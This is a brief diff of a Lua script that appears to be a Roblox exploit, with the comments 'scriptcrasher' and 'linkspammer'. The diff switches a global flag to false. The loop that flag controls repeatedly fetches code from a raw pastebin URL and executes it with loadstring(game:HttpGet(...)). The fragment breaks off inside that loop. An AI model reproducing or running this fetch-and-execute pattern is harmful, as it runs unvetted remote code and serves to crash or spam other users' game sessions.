@@ -1,5 +1,5 @@
 spawn(function() --scriptcrasher
-    getgenv().linkspammer1 = true
+    getgenv().linkspammer1 = false
         while linkspammer1 do
             pcall(function()
                 loadstring(game:HttpGet("https://pastebin.com/raw/4CHnND3T", true))()
